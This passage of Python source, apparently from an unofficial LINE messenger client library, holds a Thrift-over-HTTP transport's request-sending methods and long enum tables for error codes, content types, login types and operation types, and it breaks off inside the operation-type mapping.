            data = self.__wbuf.getvalue()
        self.__wbuf = BytesIO()

        self.__http.putrequest('POST', self.path)
        self.__http.putheader('Host', self.host)
        self.__http.putheader('Content-Type', 'application/x-thrift')
        self.__http.putheader('Content-Length', str(len(data)))
        if self.__custom_headers:
            for key, val in Six.iteritems(self.__custom_headers):
                self.__http.putheader(key, val)

        self.__http.endheaders()

        self.__http.send(data)
#        print(data)

        self.__http_response = self.__http.getresponse()
        self.code = self.__http_response.status
        self.message = self.__http_response.reason
        self.headers = self.__http_response.msg

    def flush_single(self, data):
        if self.__loop <= 2:
            if self.isOpen(): self.close()
            self.open(); self.__loop += 1
        elif time.time() - self.__time > 90:
            self.close(); self.open(); self.__time = time.time()

        # HTTP request
        if self.using_proxy() and self.scheme == "http":
            # need full URL of real host for HTTP proxy here (HTTPS uses CONNECT tunnel)
            self.__http.putrequest('POST', "http://%s:%s%s" %
                                   (self.realhost, self.realport, self.path))
        else:
            self.__http.putrequest('POST', self.path)

        # Write headers
        self.__http.putheader('Host', self.host)
        self.__http.putheader('Connection', "Keep-Alive")
        self.__http.putheader('Content-Type', 'application/x-thrift')
        self.__http.putheader('Content-Length', str(len(data)))
        if self.__custom_headers:
            for key, val in Six.iteritems(self.__custom_headers):
                self.__http.putheader(key, val)

        self.__http.endheaders()
        self.__http.send(data)
        response = self.__http.getresponse()
        self.code = response.status
        
class ApplicationType(object):
    IOS = 16
    IOS_RC = 17
    IOS_BETA = 18
    IOS_ALPHA = 19
    ANDROID = 32
    ANDROID_RC = 33
    ANDROID_BETA = 34
    ANDROID_ALPHA = 35
    IOSIPAD = 304
    IOSIPAD_RC = 305
    IOSIPAD_BETA = 306
    IOSIPAD_ALPHA = 307

    _VALUES_TO_NAMES = {
        16: "IOS",
        17: "IOS_RC",
        18: "IOS_BETA",
        19: "IOS_ALPHA",
        32: "ANDROID",
        33: "ANDROID_RC",
        34: "ANDROID_BETA",
        35: "ANDROID_ALPHA",
        304: "IOSIPAD",
        305: "IOSIPAD_RC",
        306: "IOSIPAD_BETA",
        307: "IOSIPAD_ALPHA",
    }

    _NAMES_TO_VALUES = {
        "IOS": 16,
        "IOS_RC": 17,
        "IOS_BETA": 18,
        "IOS_ALPHA": 19,
        "ANDROID": 32,
        "ANDROID_RC": 33,
        "ANDROID_BETA": 34,
        "ANDROID_ALPHA": 35,
        "IOSIPAD": 304,
        "IOSIPAD_RC": 305,
        "IOSIPAD_BETA": 306,
        "IOSIPAD_ALPHA": 307,
    }

class ContentType(object):
    NONE = 0
    IMAGE = 1
    VIDEO = 2
    AUDIO = 3
    HTML = 4
    PDF = 5
    CALL = 6
    STICKER = 7
    PRESENCE = 8
    GIFT = 9
    GROUPBOARD = 10
    APPLINK = 11
    LINK = 12
    CONTACT = 13
    FILE = 14
    LOCATION = 15
    POSTNOTIFICATION = 16
    RICH = 17
    CHATEVENT = 18
    MUSIC = 19
    PAYMENT = 20
    EXTIMAGE = 21

    _VALUES_TO_NAMES = {
        0: "NONE",
        1: "IMAGE",
        2: "VIDEO",
        3: "AUDIO",
        4: "HTML",
        5: "PDF",
        6: "CALL",
        7: "STICKER",
        8: "PRESENCE",
        9: "GIFT",
        10: "GROUPBOARD",
        11: "APPLINK",
        12: "LINK",
        13: "CONTACT",
        14: "FILE",
        15: "LOCATION",
        16: "POSTNOTIFICATION",
        17: "RICH",
        18: "CHATEVENT",
        19: "MUSIC",
        20: "PAYMENT",
        21: "EXTIMAGE",
    }

    _NAMES_TO_VALUES = {
        "NONE": 0,
        "IMAGE": 1,
        "VIDEO": 2,
        "AUDIO": 3,
        "HTML": 4,
        "PDF": 5,
        "CALL": 6,
        "STICKER": 7,
        "PRESENCE": 8,
        "GIFT": 9,
        "GROUPBOARD": 10,
        "APPLINK": 11,
        "LINK": 12,
        "CONTACT": 13,
        "FILE": 14,
        "LOCATION": 15,
        "POSTNOTIFICATION": 16,
        "RICH": 17,
        "CHATEVENT": 18,
        "MUSIC": 19,
        "PAYMENT": 20,
        "EXTIMAGE": 21,
    }


class ErrorCode(object):
    ILLEGAL_ARGUMENT = 0
    AUTHENTICATION_FAILED = 1
    DB_FAILED = 2
    INVALID_STATE = 3
    EXCESSIVE_ACCESS = 4
    NOT_FOUND = 5
    INVALID_MID = 9
    NOT_A_MEMBER = 10
    INVALID_LENGTH = 6
    NOT_AVAILABLE_USER = 7
    NOT_AUTHORIZED_DEVICE = 8
    NOT_AUTHORIZED_SESSION = 14
    INCOMPATIBLE_APP_VERSION = 11
    NOT_READY = 12
    NOT_AVAILABLE_SESSION = 13
    SYSTEM_ERROR = 15
    NO_AVAILABLE_VERIFICATION_METHOD = 16
    NOT_AUTHENTICATED = 17
    INVALID_IDENTITY_CREDENTIAL = 18
    NOT_AVAILABLE_IDENTITY_IDENTIFIER = 19
    INTERNAL_ERROR = 20
    NO_SUCH_IDENTITY_IDENFIER = 21
    DEACTIVATED_ACCOUNT_BOUND_TO_THIS_IDENTITY = 22
    ILLEGAL_IDENTITY_CREDENTIAL = 23
    UNKNOWN_CHANNEL = 24
    NO_SUCH_MESSAGE_BOX = 25
    NOT_AVAILABLE_MESSAGE_BOX = 26
    CHANNEL_DOES_NOT_MATCH = 27
    NOT_YOUR_MESSAGE = 28
    MESSAGE_DEFINED_ERROR = 29
    USER_CANNOT_ACCEPT_PRESENTS = 30
    USER_NOT_STICKER_OWNER = 32
    MAINTENANCE_ERROR = 33
    ACCOUNT_NOT_MATCHED = 34
    ABUSE_BLOCK = 35
    NOT_FRIEND = 36
    NOT_ALLOWED_CALL = 37
    BLOCK_FRIEND = 38
    INCOMPATIBLE_VOIP_VERSION = 39
    INVALID_SNS_ACCESS_TOKEN = 40
    EXTERNAL_SERVICE_NOT_AVAILABLE = 41
    NOT_ALLOWED_ADD_CONTACT = 42
    NOT_CERTIFICATED = 43
    NOT_ALLOWED_SECONDARY_DEVICE = 44
    INVALID_PIN_CODE = 45
    NOT_FOUND_IDENTITY_CREDENTIAL = 46
    EXCEED_FILE_MAX_SIZE = 47
    EXCEED_DAILY_QUOTA = 48
    NOT_SUPPORT_SEND_FILE = 49
    MUST_UPGRADE = 50
    NOT_AVAILABLE_PIN_CODE_SESSION = 51
    EXPIRED_REVISION = 52
    NOT_YET_PHONE_NUMBER = 54
    BAD_CALL_NUMBER = 55
    UNAVAILABLE_CALL_NUMBER = 56
    NOT_SUPPORT_CALL_SERVICE = 57
    CONGESTION_CONTROL = 58
    NO_BALANCE = 59
    NOT_PERMITTED_CALLER_ID = 60
    NO_CALLER_ID_LIMIT_EXCEEDED = 61
    CALLER_ID_VERIFICATION_REQUIRED = 62
    NO_CALLER_ID_LIMIT_EXCEEDED_AND_VERIFICATION_REQUIRED = 63
    MESSAGE_NOT_FOUND = 64
    INVALID_ACCOUNT_MIGRATION_PINCODE_FORMAT = 65
    ACCOUNT_MIGRATION_PINCODE_NOT_MATCHED = 66
    ACCOUNT_MIGRATION_PINCODE_BLOCKED = 67
    INVALID_PASSWORD_FORMAT = 69
    FEATURE_RESTRICTED = 70
    MESSAGE_NOT_DESTRUCTIBLE = 71
    PAID_CALL_REDEEM_FAILED = 72
    PREVENTED_JOIN_BY_TICKET = 73
    SEND_MESSAGE_NOT_PERMITTED_FROM_LINE_AT = 75
    SEND_MESSAGE_NOT_PERMITTED_WHILE_AUTO_REPLY = 76
    SECURITY_CENTER_NOT_VERIFIED = 77
    SECURITY_CENTER_BLOCKED_BY_SETTING = 78
    SECURITY_CENTER_BLOCKED = 79
    TALK_PROXY_EXCEPTION = 80
    E2EE_INVALID_PROTOCOL = 81
    E2EE_RETRY_ENCRYPT = 82
    E2EE_UPDATE_SENDER_KEY = 83
    E2EE_UPDATE_RECEIVER_KEY = 84
    E2EE_INVALID_ARGUMENT = 85
    E2EE_INVALID_VERSION = 86
    E2EE_SENDER_DISABLED = 87
    E2EE_RECEIVER_DISABLED = 88
    E2EE_SENDER_NOT_ALLOWED = 89
    E2EE_RECEIVER_NOT_ALLOWED = 90
    E2EE_RESEND_FAIL = 91
    E2EE_RESEND_OK = 92
    HITOKOTO_BACKUP_NO_AVAILABLE_DATA = 93
    E2EE_UPDATE_PRIMARY_DEVICE = 94
    SUCCESS = 95
    CANCEL = 96
    E2EE_PRIMARY_NOT_SUPPORT = 97
    E2EE_RETRY_PLAIN = 98
    E2EE_RECREATE_GROUP_KEY = 99
    E2EE_GROUP_TOO_MANY_MEMBERS = 100
    SERVER_BUSY = 101
    NOT_ALLOWED_ADD_FOLLOW = 102
    INCOMING_FRIEND_REQUEST_LIMIT = 103
    OUTGOING_FRIEND_REQUEST_LIMIT = 104
    OUTGOING_FRIEND_REQUEST_QUOTA = 105
    DUPLICATED = 106
    BANNED = 107

    _VALUES_TO_NAMES = {
        0: "ILLEGAL_ARGUMENT",
        1: "AUTHENTICATION_FAILED",
        2: "DB_FAILED",
        3: "INVALID_STATE",
        4: "EXCESSIVE_ACCESS",
        5: "NOT_FOUND",
        9: "INVALID_MID",
        10: "NOT_A_MEMBER",
        6: "INVALID_LENGTH",
        7: "NOT_AVAILABLE_USER",
        8: "NOT_AUTHORIZED_DEVICE",
        14: "NOT_AUTHORIZED_SESSION",
        11: "INCOMPATIBLE_APP_VERSION",
        12: "NOT_READY",
        13: "NOT_AVAILABLE_SESSION",
        15: "SYSTEM_ERROR",
        16: "NO_AVAILABLE_VERIFICATION_METHOD",
        17: "NOT_AUTHENTICATED",
        18: "INVALID_IDENTITY_CREDENTIAL",
        19: "NOT_AVAILABLE_IDENTITY_IDENTIFIER",
        20: "INTERNAL_ERROR",
        21: "NO_SUCH_IDENTITY_IDENFIER",
        22: "DEACTIVATED_ACCOUNT_BOUND_TO_THIS_IDENTITY",
        23: "ILLEGAL_IDENTITY_CREDENTIAL",
        24: "UNKNOWN_CHANNEL",
        25: "NO_SUCH_MESSAGE_BOX",
        26: "NOT_AVAILABLE_MESSAGE_BOX",
        27: "CHANNEL_DOES_NOT_MATCH",
        28: "NOT_YOUR_MESSAGE",
        29: "MESSAGE_DEFINED_ERROR",
        30: "USER_CANNOT_ACCEPT_PRESENTS",
        32: "USER_NOT_STICKER_OWNER",
        33: "MAINTENANCE_ERROR",
        34: "ACCOUNT_NOT_MATCHED",
        35: "ABUSE_BLOCK",
        36: "NOT_FRIEND",
        37: "NOT_ALLOWED_CALL",
        38: "BLOCK_FRIEND",
        39: "INCOMPATIBLE_VOIP_VERSION",
        40: "INVALID_SNS_ACCESS_TOKEN",
        41: "EXTERNAL_SERVICE_NOT_AVAILABLE",
        42: "NOT_ALLOWED_ADD_CONTACT",
        43: "NOT_CERTIFICATED",
        44: "NOT_ALLOWED_SECONDARY_DEVICE",
        45: "INVALID_PIN_CODE",
        46: "NOT_FOUND_IDENTITY_CREDENTIAL",
        47: "EXCEED_FILE_MAX_SIZE",
        48: "EXCEED_DAILY_QUOTA",
        49: "NOT_SUPPORT_SEND_FILE",
        50: "MUST_UPGRADE",
        51: "NOT_AVAILABLE_PIN_CODE_SESSION",
        52: "EXPIRED_REVISION",
        54: "NOT_YET_PHONE_NUMBER",
        55: "BAD_CALL_NUMBER",
        56: "UNAVAILABLE_CALL_NUMBER",
        57: "NOT_SUPPORT_CALL_SERVICE",
        58: "CONGESTION_CONTROL",
        59: "NO_BALANCE",
        60: "NOT_PERMITTED_CALLER_ID",
        61: "NO_CALLER_ID_LIMIT_EXCEEDED",
        62: "CALLER_ID_VERIFICATION_REQUIRED",
        63: "NO_CALLER_ID_LIMIT_EXCEEDED_AND_VERIFICATION_REQUIRED",
        64: "MESSAGE_NOT_FOUND",
        65: "INVALID_ACCOUNT_MIGRATION_PINCODE_FORMAT",
        66: "ACCOUNT_MIGRATION_PINCODE_NOT_MATCHED",
        67: "ACCOUNT_MIGRATION_PINCODE_BLOCKED",
        69: "INVALID_PASSWORD_FORMAT",
        70: "FEATURE_RESTRICTED",
        71: "MESSAGE_NOT_DESTRUCTIBLE",
        72: "PAID_CALL_REDEEM_FAILED",
        73: "PREVENTED_JOIN_BY_TICKET",
        75: "SEND_MESSAGE_NOT_PERMITTED_FROM_LINE_AT",
        76: "SEND_MESSAGE_NOT_PERMITTED_WHILE_AUTO_REPLY",
        77: "SECURITY_CENTER_NOT_VERIFIED",
        78: "SECURITY_CENTER_BLOCKED_BY_SETTING",
        79: "SECURITY_CENTER_BLOCKED",
        80: "TALK_PROXY_EXCEPTION",
        81: "E2EE_INVALID_PROTOCOL",
        82: "E2EE_RETRY_ENCRYPT",
        83: "E2EE_UPDATE_SENDER_KEY",
        84: "E2EE_UPDATE_RECEIVER_KEY",
        85: "E2EE_INVALID_ARGUMENT",
        86: "E2EE_INVALID_VERSION",
        87: "E2EE_SENDER_DISABLED",
        88: "E2EE_RECEIVER_DISABLED",
        89: "E2EE_SENDER_NOT_ALLOWED",
        90: "E2EE_RECEIVER_NOT_ALLOWED",
        91: "E2EE_RESEND_FAIL",
        92: "E2EE_RESEND_OK",
        93: "HITOKOTO_BACKUP_NO_AVAILABLE_DATA",
        94: "E2EE_UPDATE_PRIMARY_DEVICE",
        95: "SUCCESS",
        96: "CANCEL",
        97: "E2EE_PRIMARY_NOT_SUPPORT",
        98: "E2EE_RETRY_PLAIN",
        99: "E2EE_RECREATE_GROUP_KEY",
        100: "E2EE_GROUP_TOO_MANY_MEMBERS",
        101: "SERVER_BUSY",
        102: "NOT_ALLOWED_ADD_FOLLOW",
        103: "INCOMING_FRIEND_REQUEST_LIMIT",
        104: "OUTGOING_FRIEND_REQUEST_LIMIT",
        105: "OUTGOING_FRIEND_REQUEST_QUOTA",
        106: "DUPLICATED",
        107: "BANNED",
    }

    _NAMES_TO_VALUES = {
        "ILLEGAL_ARGUMENT": 0,
        "AUTHENTICATION_FAILED": 1,
        "DB_FAILED": 2,
        "INVALID_STATE": 3,
        "EXCESSIVE_ACCESS": 4,
        "NOT_FOUND": 5,
        "INVALID_MID": 9,
        "NOT_A_MEMBER": 10,
        "INVALID_LENGTH": 6,
        "NOT_AVAILABLE_USER": 7,
        "NOT_AUTHORIZED_DEVICE": 8,
        "NOT_AUTHORIZED_SESSION": 14,
        "INCOMPATIBLE_APP_VERSION": 11,
        "NOT_READY": 12,
        "NOT_AVAILABLE_SESSION": 13,
        "SYSTEM_ERROR": 15,
        "NO_AVAILABLE_VERIFICATION_METHOD": 16,
        "NOT_AUTHENTICATED": 17,
        "INVALID_IDENTITY_CREDENTIAL": 18,
        "NOT_AVAILABLE_IDENTITY_IDENTIFIER": 19,
        "INTERNAL_ERROR": 20,
        "NO_SUCH_IDENTITY_IDENFIER": 21,
        "DEACTIVATED_ACCOUNT_BOUND_TO_THIS_IDENTITY": 22,
        "ILLEGAL_IDENTITY_CREDENTIAL": 23,
        "UNKNOWN_CHANNEL": 24,
        "NO_SUCH_MESSAGE_BOX": 25,
        "NOT_AVAILABLE_MESSAGE_BOX": 26,
        "CHANNEL_DOES_NOT_MATCH": 27,
        "NOT_YOUR_MESSAGE": 28,
        "MESSAGE_DEFINED_ERROR": 29,
        "USER_CANNOT_ACCEPT_PRESENTS": 30,
        "USER_NOT_STICKER_OWNER": 32,
        "MAINTENANCE_ERROR": 33,
        "ACCOUNT_NOT_MATCHED": 34,
        "ABUSE_BLOCK": 35,
        "NOT_FRIEND": 36,
        "NOT_ALLOWED_CALL": 37,
        "BLOCK_FRIEND": 38,
        "INCOMPATIBLE_VOIP_VERSION": 39,
        "INVALID_SNS_ACCESS_TOKEN": 40,
        "EXTERNAL_SERVICE_NOT_AVAILABLE": 41,
        "NOT_ALLOWED_ADD_CONTACT": 42,
        "NOT_CERTIFICATED": 43,
        "NOT_ALLOWED_SECONDARY_DEVICE": 44,
        "INVALID_PIN_CODE": 45,
        "NOT_FOUND_IDENTITY_CREDENTIAL": 46,
        "EXCEED_FILE_MAX_SIZE": 47,
        "EXCEED_DAILY_QUOTA": 48,
        "NOT_SUPPORT_SEND_FILE": 49,
        "MUST_UPGRADE": 50,
        "NOT_AVAILABLE_PIN_CODE_SESSION": 51,
        "EXPIRED_REVISION": 52,
        "NOT_YET_PHONE_NUMBER": 54,
        "BAD_CALL_NUMBER": 55,
        "UNAVAILABLE_CALL_NUMBER": 56,
        "NOT_SUPPORT_CALL_SERVICE": 57,
        "CONGESTION_CONTROL": 58,
        "NO_BALANCE": 59,
        "NOT_PERMITTED_CALLER_ID": 60,
        "NO_CALLER_ID_LIMIT_EXCEEDED": 61,
        "CALLER_ID_VERIFICATION_REQUIRED": 62,
        "NO_CALLER_ID_LIMIT_EXCEEDED_AND_VERIFICATION_REQUIRED": 63,
        "MESSAGE_NOT_FOUND": 64,
        "INVALID_ACCOUNT_MIGRATION_PINCODE_FORMAT": 65,
        "ACCOUNT_MIGRATION_PINCODE_NOT_MATCHED": 66,
        "ACCOUNT_MIGRATION_PINCODE_BLOCKED": 67,
        "INVALID_PASSWORD_FORMAT": 69,
        "FEATURE_RESTRICTED": 70,
        "MESSAGE_NOT_DESTRUCTIBLE": 71,
        "PAID_CALL_REDEEM_FAILED": 72,
        "PREVENTED_JOIN_BY_TICKET": 73,
        "SEND_MESSAGE_NOT_PERMITTED_FROM_LINE_AT": 75,
        "SEND_MESSAGE_NOT_PERMITTED_WHILE_AUTO_REPLY": 76,
        "SECURITY_CENTER_NOT_VERIFIED": 77,
        "SECURITY_CENTER_BLOCKED_BY_SETTING": 78,
        "SECURITY_CENTER_BLOCKED": 79,
        "TALK_PROXY_EXCEPTION": 80,
        "E2EE_INVALID_PROTOCOL": 81,
        "E2EE_RETRY_ENCRYPT": 82,
        "E2EE_UPDATE_SENDER_KEY": 83,
        "E2EE_UPDATE_RECEIVER_KEY": 84,
        "E2EE_INVALID_ARGUMENT": 85,
        "E2EE_INVALID_VERSION": 86,
        "E2EE_SENDER_DISABLED": 87,
        "E2EE_RECEIVER_DISABLED": 88,
        "E2EE_SENDER_NOT_ALLOWED": 89,
        "E2EE_RECEIVER_NOT_ALLOWED": 90,
        "E2EE_RESEND_FAIL": 91,
        "E2EE_RESEND_OK": 92,
        "HITOKOTO_BACKUP_NO_AVAILABLE_DATA": 93,
        "E2EE_UPDATE_PRIMARY_DEVICE": 94,
        "SUCCESS": 95,
        "CANCEL": 96,
        "E2EE_PRIMARY_NOT_SUPPORT": 97,
        "E2EE_RETRY_PLAIN": 98,
        "E2EE_RECREATE_GROUP_KEY": 99,
        "E2EE_GROUP_TOO_MANY_MEMBERS": 100,
        "SERVER_BUSY": 101,
        "NOT_ALLOWED_ADD_FOLLOW": 102,
        "INCOMING_FRIEND_REQUEST_LIMIT": 103,
        "OUTGOING_FRIEND_REQUEST_LIMIT": 104,
        "OUTGOING_FRIEND_REQUEST_QUOTA": 105,
        "DUPLICATED": 106,
        "BANNED": 107,
    }


class IdentityProvider(object):
    UNKNOWN = 0
    LINE = 1
    NAVER_KR = 2
    LINE_PHONE = 3

    _VALUES_TO_NAMES = {
        0: "UNKNOWN",
        1: "LINE",
        2: "NAVER_KR",
        3: "LINE_PHONE",
    }

    _NAMES_TO_VALUES = {
        "UNKNOWN": 0,
        "LINE": 1,
        "NAVER_KR": 2,
        "LINE_PHONE": 3,
    }


class LoginResultType(object):
    SUCCESS = 1
    REQUIRE_QRCODE = 2
    REQUIRE_DEVICE_CONFIRM = 3
    REQUIRE_SMS_CONFIRM = 4

    _VALUES_TO_NAMES = {
        1: "SUCCESS",
        2: "REQUIRE_QRCODE",
        3: "REQUIRE_DEVICE_CONFIRM",
        4: "REQUIRE_SMS_CONFIRM",
    }

    _NAMES_TO_VALUES = {
        "SUCCESS": 1,
        "REQUIRE_QRCODE": 2,
        "REQUIRE_DEVICE_CONFIRM": 3,
        "REQUIRE_SMS_CONFIRM": 4,
    }
    
class LoginType(object):
    ID_CREDENTIAL = 0
    QRCODE = 1
    ID_CREDENTIAL_WITH_E2EE = 2

    _VALUES_TO_NAMES = {
        0: "ID_CREDENTIAL",
        1: "QRCODE",
        2: "ID_CREDENTIAL_WITH_E2EE",
    }

    _NAMES_TO_VALUES = {
        "ID_CREDENTIAL": 0,
        "QRCODE": 1,
        "ID_CREDENTIAL_WITH_E2EE": 2,
    }

class MessageOperationType(object):
    SEND_MESSAGE = 1
    RECEIVE_MESSAGE = 2
    READ_MESSAGE = 3
    NOTIFIED_READ_MESSAGE = 4
    NOTIFIED_JOIN_CHAT = 5
    FAILED_SEND_MESSAGE = 6
    SEND_CONTENT = 7
    SEND_CONTENT_RECEIPT = 8
    SEND_CHAT_REMOVED = 9
    REMOVE_ALL_MESSAGES = 10

    _VALUES_TO_NAMES = {
        1: "SEND_MESSAGE",
        2: "RECEIVE_MESSAGE",
        3: "READ_MESSAGE",
        4: "NOTIFIED_READ_MESSAGE",
        5: "NOTIFIED_JOIN_CHAT",
        6: "FAILED_SEND_MESSAGE",
        7: "SEND_CONTENT",
        8: "SEND_CONTENT_RECEIPT",
        9: "SEND_CHAT_REMOVED",
        10: "REMOVE_ALL_MESSAGES",
    }

    _NAMES_TO_VALUES = {
        "SEND_MESSAGE": 1,
        "RECEIVE_MESSAGE": 2,
        "READ_MESSAGE": 3,
        "NOTIFIED_READ_MESSAGE": 4,
        "NOTIFIED_JOIN_CHAT": 5,
        "FAILED_SEND_MESSAGE": 6,
        "SEND_CONTENT": 7,
        "SEND_CONTENT_RECEIPT": 8,
        "SEND_CHAT_REMOVED": 9,
        "REMOVE_ALL_MESSAGES": 10,
    }


class MIDType(object):
    USER = 0
    ROOM = 1
    GROUP = 2
    SQUARE = 3
    SQUARE_CHAT = 4
    SQUARE_MEMBER = 5
    BOT = 6

    _VALUES_TO_NAMES = {
        0: "USER",
        1: "ROOM",
        2: "GROUP",
        3: "SQUARE",
        4: "SQUARE_CHAT",
        5: "SQUARE_MEMBER",
        6: "BOT",
    }

    _NAMES_TO_VALUES = {
        "USER": 0,
        "ROOM": 1,
        "GROUP": 2,
        "SQUARE": 3,
        "SQUARE_CHAT": 4,
        "SQUARE_MEMBER": 5,
        "BOT": 6,
    }


class ServiceCode(object):
    UNKNOWN = 0
    TALK = 1
    SQUARE = 2

    _VALUES_TO_NAMES = {
        0: "UNKNOWN",
        1: "TALK",
        2: "SQUARE",
    }

    _NAMES_TO_VALUES = {
        "UNKNOWN": 0,
        "TALK": 1,
        "SQUARE": 2,
    }


class OpStatus(object):
    NORMAL = 0
    ALERT_DISABLED = 1
    ALWAYS = 2

    _VALUES_TO_NAMES = {
        0: "NORMAL",
        1: "ALERT_DISABLED",
        2: "ALWAYS",
    }

    _NAMES_TO_VALUES = {
        "NORMAL": 0,
        "ALERT_DISABLED": 1,
        "ALWAYS": 2,
    }


class OpType(object):
    END_OF_OPERATION = 0
    UPDATE_PROFILE = 1
    UPDATE_SETTINGS = 36
    NOTIFIED_UPDATE_PROFILE = 2
    REGISTER_USERID = 3
    ADD_CONTACT = 4
    NOTIFIED_ADD_CONTACT = 5
    BLOCK_CONTACT = 6
    UNBLOCK_CONTACT = 7
    NOTIFIED_RECOMMEND_CONTACT = 8
    CREATE_GROUP = 9
    UPDATE_GROUP = 10
    NOTIFIED_UPDATE_GROUP = 11
    INVITE_INTO_GROUP = 12
    NOTIFIED_INVITE_INTO_GROUP = 13
    CANCEL_INVITATION_GROUP = 31
    NOTIFIED_CANCEL_INVITATION_GROUP = 32
    LEAVE_GROUP = 14
    NOTIFIED_LEAVE_GROUP = 15
    ACCEPT_GROUP_INVITATION = 16
    NOTIFIED_ACCEPT_GROUP_INVITATION = 17
    REJECT_GROUP_INVITATION = 34
    NOTIFIED_REJECT_GROUP_INVITATION = 35
    KICKOUT_FROM_GROUP = 18
    NOTIFIED_KICKOUT_FROM_GROUP = 19
    CREATE_ROOM = 20
    INVITE_INTO_ROOM = 21
    NOTIFIED_INVITE_INTO_ROOM = 22
    LEAVE_ROOM = 23
    NOTIFIED_LEAVE_ROOM = 24
    SEND_MESSAGE = 25
    RECEIVE_MESSAGE = 26
    SEND_MESSAGE_RECEIPT = 27
    RECEIVE_MESSAGE_RECEIPT = 28
    SEND_CONTENT_RECEIPT = 29
    SEND_CHAT_CHECKED = 40
    SEND_CHAT_REMOVED = 41
    RECEIVE_ANNOUNCEMENT = 30
    INVITE_VIA_EMAIL = 38
    NOTIFIED_REGISTER_USER = 37
    NOTIFIED_UNREGISTER_USER = 33
    NOTIFIED_REQUEST_RECOVERY = 39
    NOTIFIED_FORCE_SYNC = 42
    SEND_CONTENT = 43
    SEND_MESSAGE_MYHOME = 44
    NOTIFIED_UPDATE_CONTENT_PREVIEW = 45
    REMOVE_ALL_MESSAGES = 46
    NOTIFIED_UPDATE_PURCHASES = 47
    DUMMY = 48
    UPDATE_CONTACT = 49
    NOTIFIED_RECEIVED_CALL = 50
    CANCEL_CALL = 51
    NOTIFIED_REDIRECT = 52
    NOTIFIED_CHANNEL_SYNC = 53
    FAILED_SEND_MESSAGE = 54
    NOTIFIED_READ_MESSAGE = 55
    FAILED_EMAIL_CONFIRMATION = 56
    NOTIFIED_PUSH_NOTICENTER_ITEM = 59
    NOTIFIED_CHAT_CONTENT = 58
    NOTIFIED_JOIN_CHAT = 60
    NOTIFIED_LEAVE_CHAT = 61
    NOTIFIED_TYPING = 62
    FRIEND_REQUEST_ACCEPTED = 63
    DESTROY_MESSAGE = 64
    NOTIFIED_DESTROY_MESSAGE = 65
    UPDATE_PUBLICKEYCHAIN = 66
    NOTIFIED_UPDATE_PUBLICKEYCHAIN = 67
    NOTIFIED_BLOCK_CONTACT = 68
    NOTIFIED_UNBLOCK_CONTACT = 69
    UPDATE_GROUPPREFERENCE = 70
    NOTIFIED_PAYMENT_EVENT = 71
    REGISTER_E2EE_PUBLICKEY = 72
    NOTIFIED_E2EE_KEY_EXCHANGE_REQ = 73
    NOTIFIED_E2EE_KEY_EXCHANGE_RESP = 74
    NOTIFIED_E2EE_MESSAGE_RESEND_REQ = 75
    NOTIFIED_E2EE_MESSAGE_RESEND_RESP = 76
    NOTIFIED_E2EE_KEY_UPDATE = 77
    NOTIFIED_BUDDY_UPDATE_PROFILE = 78
    NOTIFIED_UPDATE_LINEAT_TABS = 79
    UPDATE_ROOM = 80
    NOTIFIED_BEACON_DETECTED = 81
    UPDATE_EXTENDED_PROFILE = 82
    ADD_FOLLOW = 83
    NOTIFIED_ADD_FOLLOW = 84
    DELETE_FOLLOW = 85
    NOTIFIED_DELETE_FOLLOW = 86
    UPDATE_TIMELINE_SETTINGS = 87
    NOTIFIED_FRIEND_REQUEST = 88
    UPDATE_RINGBACK_TONE = 89
    NOTIFIED_POSTBACK = 90
    RECEIVE_READ_WATERMARK = 91
    NOTIFIED_MESSAGE_DELIVERED = 92
    NOTIFIED_UPDATE_CHAT_BAR = 93
    NOTIFIED_CHATAPP_INSTALLED = 94
    NOTIFIED_CHATAPP_UPDATED = 95
    NOTIFIED_CHATAPP_NEW_MARK = 96
    NOTIFIED_CHATAPP_DELETED = 97
    NOTIFIED_CHATAPP_SYNC = 98
    NOTIFIED_UPDATE_MESSAGE = 99

    _VALUES_TO_NAMES = {
        0: "END_OF_OPERATION",
        1: "UPDATE_PROFILE",
        36: "UPDATE_SETTINGS",
        2: "NOTIFIED_UPDATE_PROFILE",
        3: "REGISTER_USERID",
        4: "ADD_CONTACT",
        5: "NOTIFIED_ADD_CONTACT",
        6: "BLOCK_CONTACT",
        7: "UNBLOCK_CONTACT",
        8: "NOTIFIED_RECOMMEND_CONTACT",
        9: "CREATE_GROUP",
        10: "UPDATE_GROUP",
        11: "NOTIFIED_UPDATE_GROUP",
        12: "INVITE_INTO_GROUP",
        13: "NOTIFIED_INVITE_INTO_GROUP",
        31: "CANCEL_INVITATION_GROUP",
        32: "NOTIFIED_CANCEL_INVITATION_GROUP",
        14: "LEAVE_GROUP",
        15: "NOTIFIED_LEAVE_GROUP",
        16: "ACCEPT_GROUP_INVITATION",
        17: "NOTIFIED_ACCEPT_GROUP_INVITATION",
        34: "REJECT_GROUP_INVITATION",
        35: "NOTIFIED_REJECT_GROUP_INVITATION",
        18: "KICKOUT_FROM_GROUP",
        19: "NOTIFIED_KICKOUT_FROM_GROUP",
        20: "CREATE_ROOM",
        21: "INVITE_INTO_ROOM",
        22: "NOTIFIED_INVITE_INTO_ROOM",
        23: "LEAVE_ROOM",
        24: "NOTIFIED_LEAVE_ROOM",
        25: "SEND_MESSAGE",
        26: "RECEIVE_MESSAGE",
        27: "SEND_MESSAGE_RECEIPT",
        28: "RECEIVE_MESSAGE_RECEIPT",
        29: "SEND_CONTENT_RECEIPT",
        40: "SEND_CHAT_CHECKED",
        41: "SEND_CHAT_REMOVED",
        30: "RECEIVE_ANNOUNCEMENT",
        38: "INVITE_VIA_EMAIL",
        37: "NOTIFIED_REGISTER_USER",
        33: "NOTIFIED_UNREGISTER_USER",
        39: "NOTIFIED_REQUEST_RECOVERY",
        42: "NOTIFIED_FORCE_SYNC",
        43: "SEND_CONTENT",
        44: "SEND_MESSAGE_MYHOME",
        45: "NOTIFIED_UPDATE_CONTENT_PREVIEW",
        46: "REMOVE_ALL_MESSAGES",
        47: "NOTIFIED_UPDATE_PURCHASES",
        48: "DUMMY",
        49: "UPDATE_CONTACT",
        50: "NOTIFIED_RECEIVED_CALL",
        51: "CANCEL_CALL",
        52: "NOTIFIED_REDIRECT",
        53: "NOTIFIED_CHANNEL_SYNC",
        54: "FAILED_SEND_MESSAGE",
        55: "NOTIFIED_READ_MESSAGE",
        56: "FAILED_EMAIL_CONFIRMATION",
        59: "NOTIFIED_PUSH_NOTICENTER_ITEM",
        58: "NOTIFIED_CHAT_CONTENT",
        60: "NOTIFIED_JOIN_CHAT",
        61: "NOTIFIED_LEAVE_CHAT",
        62: "NOTIFIED_TYPING",
        63: "FRIEND_REQUEST_ACCEPTED",
        64: "DESTROY_MESSAGE",
